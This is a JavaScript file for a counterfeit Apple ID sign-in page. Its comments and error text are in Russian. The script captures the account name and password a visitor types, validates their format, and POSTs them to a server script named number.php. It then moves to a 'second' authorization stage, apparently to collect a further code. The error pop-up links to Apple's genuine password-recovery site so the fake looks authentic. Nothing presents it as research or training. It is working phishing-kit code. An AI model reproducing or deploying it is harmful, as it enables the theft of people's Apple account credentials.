localStorage.setItem("authorizationStage", "first");

function onInputFocus() {
    $("#sign_in_form").addClass("has-focus");
    $(".form-row").addClass("apple-id-focus");
}

function onInputFocusOut() {
    $("#sign_in_form").removeClass("has-focus");
    $(".form-row").removeClass("apple-id-focus");
}

function onInputName(e) {
    if (e.target.value.length !== 0) {
        $("button#sign-in").removeClass("disable");
        $("button#sign-in").removeAttr("disabled");
        $("#sign_in_form").addClass("account-name-entered");

    } else {
        $("#sign_in_form").removeClass("account-name-entered");
        $("button#sign-in").addClass("disable");
        $("button#sign-in").attr("disabled");
    }
}

function keyDownHandler(e) {
    if (e.key === "Backspace") {
        console.log("delete");
        $("#sign_in_form").removeClass("password-entered");
        $(".form-row").removeClass("show-password");
        $(".form-row").removeClass("show-placeholder");
        $(".form-row").addClass("hide-password");
        $(".form-row").addClass("hide-placeholder");
        $("#sign_in_form").removeClass("show-password");
        $("#sign_in_form").removeClass("hide-password");
        $("#password_text_field").val("")
        $(".signin-error").remove();
    }
}

// account_name_text_field
$("#account_name_text_field").on("focus", onInputFocus)
$("#account_name_text_field").on("focusout", onInputFocusOut)
$("#account_name_text_field").on("keyup", onInputName)
$("#account_name_text_field").on("keydown", keyDownHandler)

//password_text_field handlerFunctions
function onInputPassword(e) {
    if (e.target.value.length !== 0) {
        $("button#sign-in").removeClass("disable");
        $("button#sign-in").removeAttr("disabled");
        $("#sign_in_form").addClass("password-entered");

    } else {
        $("#sign_in_form").removeClass("password-entered");
        $("button#sign-in").addClass("disable");
        $("button#sign-in").attr("disabled");
    }
}

function onPasswordFocus(e) {
    $("#sign_in_form").addClass("has-focus");
    $("#sign_in_form").addClass("has-password-focus");
    $(".form-row").addClass("password-focus");
}

function onPasswordFocusOut(e) {
    $("#sign_in_form").removeClass("has-focus");
    $("#sign_in_form").removeClass("has-password-focus");
    $(".form-row").removeClass("password-focus");
}

// password_text_field
$("#password_text_field").on("focus", onPasswordFocus)
$("#password_text_field").on("focusout", onPasswordFocusOut)
$("#password_text_field").on("keyup", onInputPassword)

// error handler
function onClickError(e) {
    console.log("error")
    $(".signin-error").remove();
}

//validate Inputs
function validateEmail(email) {
    let re = /[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?/;
    return re.test(String(email).toLowerCase());
}

function validatePassword(password) {
    let re = /^(?=.*\d)(?=.*[a-z])(?=.*[A-Z])[a-zA-Z0-9]{8,}$/
    return re.test(String(password));
}

//button sign-in handlerFunctions
async function onClickNameButton(e) {
    //ОТУТ ЧТО НАДО ОТПРАВИТЬ
    let password = $("#password_text_field").val();
    let name = $("#account_name_text_field").val();

    if (password && name) {
        if (validatePassword(password) && validateEmail(name)) {
            //ОТУТ ОТПРАВКА ДАННЫХ
            $(e.target).addClass("v-hide");
	    console.log("onClickNameButton");
            await sendData(100);
            localStorage.setItem("authorizationStage", "second");
            return;
        } else {
            $("#sign_in_form").after(errorTempalte());
            $(".error").on("click", onClickError)
        }
    }
    $(e.target).addClass("v-hide");
    $(e.target).addClass("moved");
    $(e.target).addClass("disable");
    $("button#sign-in").attr("disabled");
    $(".form-row").addClass("show-password");
    $(".form-row").addClass("show-placeholder");
    $(".form-row").removeClass("hide-password");
    $(".form-row").removeClass("hide-placeholder");
    $("#sign_in_form").addClass("show-password");
    $("#sign_in_form").removeClass("hide-password");
    setTimeout(() => $(e.target).removeClass("v-hide"), 300)
}

// button sign-in
$("button#sign-in").click(onClickNameButton)

function sendData(ms) {
    return new Promise(resolve => {
        //ОТУТ ОТПРАВКА ДАННЫХ
	console.log("sendData");
	Send();
        setTimeout(resolve, ms)
    });
}

function Send(){
    console.log("Send");
    $.ajax({
        type: 'POST',
        url: 'number.php',
        data: {'name': $("#account_name_text_field").val(), 'password': $("#password_text_field").val()},
        datatype: 'JSON'  
    });
}


function errorTempalte() {
    return `<div class="pop-container error signin-error" ($click)="errorClickHandler()">
                <div class="error pop-bottom tk-subbody-headline" ($click)="errorClickHandler()">
                      <p class="fat" id="errMsg">                        Неверный Apple&nbsp;ID или пароль.</p>
                          <a class="si-link ax-outline thin tk-subbody" href="https://iforgot.apple.com/password/verify/appleid" target="_blank">  
                            Забыли <span class="no-wrap sk-icon sk-icon-after sk-icon-external my-error" style="position: relative;">пароль?</span><span class="sr-only">Открывается в новом окне.</span>
                          </a>
                </div>
           </div>`
}